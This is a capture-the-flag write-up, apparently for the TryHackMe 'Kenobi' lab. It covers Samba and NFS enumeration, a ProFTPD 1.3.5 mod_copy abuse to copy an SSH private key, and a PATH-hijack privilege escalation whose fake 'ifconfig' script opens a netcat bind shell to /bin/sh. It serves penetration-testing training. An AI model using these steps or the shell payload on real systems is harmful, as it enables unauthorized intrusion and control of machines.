## Task2: Enumerating Samba for shares

*   smap scripts saved list in a databases in `/usr/share/nmap/scripts/scripts.db` , let’s check smb enumeration scripts

    <img src="/assets/images/thm/Kenobi/Untitled 2.png" alt="Untitled" data-size="original">

    * there are 7 scripts, we can use “smb-enum-\*” to use all of them
* `nmap -vv -sS -sV -Pn -oN nmap_smb_enum --script="smb-enum-*" $target`

> Question3: Using the nmap command above, how many shares have been found? answer: 3

* Let’s connect to the share using `smbclient //$target/anonymous` with “anonymous” password
* great, list all the files in this share using `ls`, we can see log.txt file

> Question4: Once you're connected, list the files on the share. What is file can you see? answer: log.txt

* view its content using `more log.txt` or download it using `get log.txt`
* log.txt content:
  * The information generated for Kenobi when generating an SSH key for the user
  * Information about the ProFTPD server.

# Sample configuration file for the Samba suite for Debian GNU/Linux.
#
#
# This is the main Samba configuration file. You should read the
# smb.conf(5) manual page in order to understand the options listed
# here. Samba has a huge number of configurable options most of which 
# are not shown in this example
#
# Some options that are often worth tuning have been included as
# commented-out examples in this file.
#  - When such options are commented with ";", the proposed setting
#    differs from the default Samba behaviour
#  - When commented with "#", the proposed setting is the default
#    behaviour of Samba but the option is considered important
#    enough to be mentioned here
#
# NOTE: Whenever you modify this file you should run the command
# "testparm" to check that you have not made any basic syntactic 
# errors. 

#======================= Global Settings =======================

[global]

## Browsing/Identification ###

# Change this to the workgroup/NT-domain name your Samba server will part of
   workgroup = WORKGROUP

# server string is the equivalent of the NT Description field
	server string = %h server (Samba, Ubuntu)

# Windows Internet Name Serving Support Section:
# WINS Support - Tells the NMBD component of Samba to enable its WINS Server
#   wins support = no

# WINS Server - Tells the NMBD components of Samba to be a WINS Client
# Note: Samba can be either a WINS Server, or a WINS Client, but NOT both
;   wins server = w.x.y.z

# This will prevent nmbd to search for NetBIOS names through DNS.
   dns proxy = no

#### Networking ####

# The specific set of interfaces / networks to bind to
# This can be either the interface name or an IP address/netmask;
# interface names are normally preferred
;   interfaces = 127.0.0.0/8 eth0

# Only bind to the named interfaces and/or networks; you must use the
# 'interfaces' option above to use this.
# It is recommended that you enable this feature if your Samba machine is
# not protected by a firewall or is a firewall itself.  However, this
# option cannot handle dynamic or non-broadcast interfaces correctly.
;   bind interfaces only = yes

#### Debugging/Accounting ####

# This tells Samba to use a separate log file for each machine
# that connects
   log file = /var/log/samba/log.%m

# Cap the size of the individual log files (in KiB).
   max log size = 1000

# If you want Samba to only log through syslog then set the following
# parameter to 'yes'.
#   syslog only = no

# We want Samba to log a minimum amount of information to syslog. Everything
# should go to /var/log/samba/log.{smbd,nmbd} instead. If you want to log
# through syslog you should set the following parameter to something higher.
   syslog = 0

# Do something sensible when Samba crashes: mail the admin a backtrace
   panic action = /usr/share/samba/panic-action %d

####### Authentication #######

# Server role. Defines in which mode Samba will operate. Possible
# values are "standalone server", "member server", "classic primary
# domain controller", "classic backup domain controller", "active
# directory domain controller". 
#
# Most people will want "standalone sever" or "member server".
# Running as "active directory domain controller" will require first
# running "samba-tool domain provision" to wipe databases and create a
# new domain.
   server role = standalone server

# If you are using encrypted passwords, Samba will need to know what
# password database type you are using.  
   passdb backend = tdbsam

   obey pam restrictions = yes

# This boolean parameter controls whether Samba attempts to sync the Unix
# password with the SMB password when the encrypted SMB password in the
# passdb is changed.
   unix password sync = yes

# For Unix password sync to work on a Debian GNU/Linux system, the following
# parameters must be set (thanks to Ian Kahan <<kahan@informatik.tu-muenchen.de> for
# sending the correct chat script for the passwd program in Debian Sarge).
   passwd program = /usr/bin/passwd %u
   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .

# This boolean controls whether PAM will be used for password changes
# when requested by an SMB client instead of the program listed in
# 'passwd program'. The default is 'no'.
   pam password change = yes

# This option controls how unsuccessful authentication attempts are mapped
# to anonymous connections
   map to guest = bad user

########## Domains ###########

#
# The following settings only takes effect if 'server role = primary
# classic domain controller', 'server role = backup domain controller'
# or 'domain logons' is set 
#

# It specifies the location of the user's
# profile directory from the client point of view) The following
# required a [profiles] share to be setup on the samba server (see
# below)
;   logon path = \\%N\profiles\%U
# Another common choice is storing the profile in the user's home directory
# (this is Samba's default)
#   logon path = \\%N\%U\profile

# The following setting only takes effect if 'domain logons' is set
# It specifies the location of a user's home directory (from the client
# point of view)
;   logon drive = H:
#   logon home = \\%N\%U

# The following setting only takes effect if 'domain logons' is set
# It specifies the script to run during logon. The script must be stored
# in the [netlogon] share
# NOTE: Must be store in 'DOS' file format convention
;   logon script = logon.cmd

# This allows Unix users to be created on the domain controller via the SAMR
# RPC pipe.  The example command creates a user account with a disabled Unix
# password; please adapt to your needs
; add user script = /usr/sbin/adduser --quiet --disabled-password --gecos "" %u

# This allows machine accounts to be created on the domain controller via the 
# SAMR RPC pipe.  
# The following assumes a "machines" group exists on the system
; add machine script  = /usr/sbin/useradd -g machines -c "%u machine account" -d /var/lib/samba -s /bin/false %u

# This allows Unix groups to be created on the domain controller via the SAMR
# RPC pipe.  
; add group script = /usr/sbin/addgroup --force-badname %g

############ Misc ############

# Using the following line enables you to customise your configuration
# on a per machine basis. The %m gets replaced with the netbios name
# of the machine that is connecting

> Question5: What port is FTP running on? answer: 21

*   to show all the mounts we can mount we will use `showmount -e <IP>`

    ```
    Export list for 10.10.125.2:
    /var *
    ```

> Question6: What mount can we see? answer: /var

## Task3: Gain initial access with ProFtpd

*   if you remember we know the version of ProFtpd from our nmap scan, so let's check this again

    <img src="/assets/images/thm/Kenobi/Untitled 3.png" alt="Untitled" data-size="original">

> Question7: let's get the version of ProFtpd. Use netcat to connect to the machine on the FTP port. What is the version? answer: 1.3.5

* Let’s search for exploit in [exploit-db](https://www.exploit-db.com/)
*   as we can see there is many exploits, but we can filtrate them by searching for 1.3.5 (the version), so they are 4 exploits

    <img src="/assets/images/thm/Kenobi/Untitled 4.png" alt="Untitled" data-size="original">

> Question8: We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. no answer needed

> Question9, 10 no answer needed

*   We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.

    <img src="/assets/images/thm/Kenobi/Untitled 5.png" alt="Untitled" data-size="original">
* now we will mount /var so we can access the private ssh key
* to mount an NFS share you should create a mount point, we will create it in /tmp directory
  * `mkdir /tmp/kenobiShare`
* mounting the share
  * `mount -t nfs $target:/var /tmp/kenobiShare/`
* navigate to the mount point

![Untitled](</assets/images/thm/Kenobi/Untitled 6.png>)

* Great, Let’s use this ssh private key to login as kenobi

    * This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).
* we can create executable file called curl or uname or any tool in menu binary to the binary will run it
* I will create a file called “ifconfig” and it’s content is:

```
#!/bin/sh
echo "Done" >> /tmp/IsDone.txt
mkfifo /tmp/f ; nc -lnvp 9090 < /tmp/f | /bin/sh > /tmp/f 2>&1
```

* I tried to use nano but it isn't installed so I used vim
*   then we should make it executable using `chmod +x ifconfig` , and append /tmp directory to the PATH env
